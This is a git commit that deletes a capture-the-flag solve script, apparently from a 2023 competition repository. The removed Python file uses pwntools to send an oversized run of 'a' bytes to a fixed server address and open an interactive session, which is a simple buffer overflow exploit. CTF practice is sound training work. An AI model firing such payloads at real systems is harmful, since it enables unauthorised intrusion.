7fab2bbca6568d3fbc71bbc1fa976ed7da3f9346
Gavriel Pramuda Kurniaadi <51376746+GavrielAdi@users.noreply.github.com>
2023-09-04 23:54:38 +0700

    Delete 2023/The Journey to HCS 2023/pwn/scream/solve directory

--- 2023/The Journey to HCS 2023/pwn/scream/solve/solve.py
+++
@@ -1,9 +0,0 @@
-from pwn import *
-
-def exploit(host, port):
-    with remote(host, port) as io:
-        payload = b'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa'
-        io.sendline(payload)
-        io.interactive()
-
-exploit('34.101.202.34', 10005)
